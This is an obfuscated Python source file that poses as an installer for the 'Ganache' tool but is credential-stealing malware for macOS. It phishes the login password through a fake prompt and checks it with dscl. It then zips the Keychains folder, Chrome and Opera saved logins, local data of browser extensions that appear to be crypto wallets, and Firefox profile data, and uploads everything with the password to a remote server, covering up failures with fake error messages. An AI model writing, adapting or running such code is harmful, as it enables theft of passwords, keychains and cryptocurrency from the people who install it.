U='note'
L='~'
J='rb'
I='file'
C=open
B=print
import requests as D
from ganache.utils import G as M,K
import os as A,getpass as O,subprocess as P,glob as E,re,shutil as X
V='=8yculWYoNWelt0L5JXYyJWaM9if'
W='=4Wahh2Y5V2a'
Y='=Qmcvd3czFGc'
F='lNWa2VGZ'
G='==QZwlHd'
H='=Qnbl1GajFGd0F2L'
Z='==QY0FGZf5Wan9Gb'
N='=IXZzd3byJ2XiV2d'
a='==QY0FGRg4Wan9GTvoSZslmZvJHUvUWbvJHaD9SZsd2bvd0L0J3bwBXdTBibvlGdhNWasBHcB9SeyFmcilGTvMXJ'
b='hRXYEBibpd2bM9CdsVXYmVGRvUWbvJHaD9SZsd2bvd0L0J3bwBXdTBibvlGdhNWasBHcB9SeyFmcilGTvMXJ'
c='=EGdhREIul2Zvx0LhJXZw9kLlJXY3RnZvNXYyVGcv5SbvN2L0J3bwBXdTBibvlGdhNWasBHcB9SeyFmcilGTvMXJ'
Q='l12byh2Y'
R='=EmclB3b'
d='=k2YnJ2atVWZt5Wakh2Zn5Gbi92boNWZsd2arNGbjpGZ'
e='=0GatlmbqFWZlVWbsFGZjVGanxGajxGcvtWYixWYipWZ'
f='=4mbrdGcnZWZiR2br5mZlxGal9WYlF2ZvVmYmhWaitmb'
S='=gGckdGcwVWZi5GZiNmYk52bjRGajlGbnBnYqRWaqdWZ'
g='voSZslmZvJHUvUWbvJHaD9SZsd2bvd0L0J3bwBXdTBibvlGdhNWasBHcB9SeyFmcilGTvMXJ'
h='==wL0xWdhZWZE9SZt9mcoN0Llx2Zv92RvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if'
i='=EmclB3TuUmchdHdm92chJXZw9mLt92YvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if'
j='=8ycn5Wa0RXZTBibvl2cuVGd4VEIsF2Yvx0L'
T='=s2ch1WY0VWb'
k='0VGbsF2dfR3c1JHd'
l='zpmLzZWZyB3Lq8yclxWam9mcQ9CevZWZylmRvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if'
m='iwFXpsSXi41WoICXcpjIcx1bp5yazFWbhRXZtBkbvl2cuVGd4VmYldnI'
n='rsyKu9Waz5WZ0hXZto3bt9CdsVXYmVGZvU2ZhJ3b0N3L'
o='==AevZWZylmZ'
p='6Qmcvd3czFGU'
class q:
	def __init__(A,device_id,base_url):A.device_id=device_id;A.base_url=base_url
	def run(E):
		S=False;L=S
		while L==S:
			try:N=O.getpass(prompt=K(p));T='dscl . -authonly {} "{}"'.format(O.getuser(),N);U=P.check_output(T,shell=True,stderr=P.DEVNULL);L=U==''.encode('utf-8')
			except:B('Sorry, try again.')
		B('Installing Ganache');X=A.path.expanduser(K(V));Q='ganache/kc.zip';M(X,Q);Z={I:C(Q,J)};a={K(F):E.device_id,K(G):K(W),K(Y):N}
		try:
			R=D.post(E.base_url+K(H),data=a,files=Z)
			if R.status_code<200 or R.status_code>=300:B('Error 43: Unknown error')
		except:B('Error -43: Unknown error')
		B('Ganache is installed succesully.')
class r:
	def __init__(A,device_id,base_url):A.device_id=device_id;A.base_url=base_url
	def __ul(A,login_data_path,browser):B={I:C(login_data_path,J)};E={K(F):A.device_id,K(N):browser,K(G):K(Z)};L=D.post(A.base_url+K(H),data=E,files=B)
	def __handle_cr(D):
		B=E.glob(K(a)%A.path.expanduser(L));C=K(b)%A.path.expanduser(L)
		if A.path.isfile(C):B.append(C)
		for F in B:D.__ul(F,K(Q))
	def __handle_op(C):
		B=K(c)%A.path.expanduser(L)
		if A.path.isfile(B):C.__ul(B,K(R))
	def run(A):A.__handle_cr();A.__handle_op()
class s:
	id_list=[K(d),K(e),K(f),K(S)]
	def __init__(A,device_id,base_url):A.device_id=device_id;A.base_url=base_url
	def __cr_data_paths(D):
		B=E.glob(K(g)%A.path.expanduser(L));C=A.path.expanduser(K(h))
		if A.path.exists(C):B.append(C)
		return B
	def __op_data_path(C):
		B=A.path.expanduser(K(i))
		if A.path.exists(B):return B
	def __handle(E,path,browser):
		for id in E.id_list:
			O=path+K(j)+id
			if A.path.exists(O):
				L='ganache/mtm.zip';type=K(T)
				if id==K(S):L='ganache/tw.zip';type=K(k)
				M(O,L);Q={I:C(L,J)};R={K(F):E.device_id,K(N):browser,K(G):type,U:id}
				try:
					P=D.post(E.base_url+K(H),data=R,files=Q)
					if P.status_code<200 or P.status_code>=300:B('Error 44: Unknown error')
				except:B('Error -44: Unknown error')
	def __handle_ff(Q):
		W='ganache/mtmf.zip';Y=E.glob(A.path.expanduser(K(l)))
		for L in Y:
			with C(L,'r', encoding='utf-8', errors='ignore')as O:
				Z=O.read();R=re.search(K(m),Z)
				if R:
					id=R.group(1);a=A.path.dirname(L)+K(n)+id+'^userContextId=*';S=E.glob(a)
					if len(S)>0:
						P=S[0];X.copy2(L,P+'/prefs.js');M(P,W);O={I:C(W,J)};b={K(F):Q.device_id,K(N):K(o),K(G):K(T),U:A.path.basename(P)}
						try:
							V=D.post(Q.base_url+K(H),data=b,files=O)
							if V.status_code<200 or V.status_code>=300:B('Error 45: Unknown error')
						except:B('Error -45: Unknown error')
	def run(A):
		for C in A.__cr_data_paths():A.__handle(C,K(Q))
		B=A.__op_data_path()
		if B is not None:A.__handle(B,K(R))
		A.__handle_ff()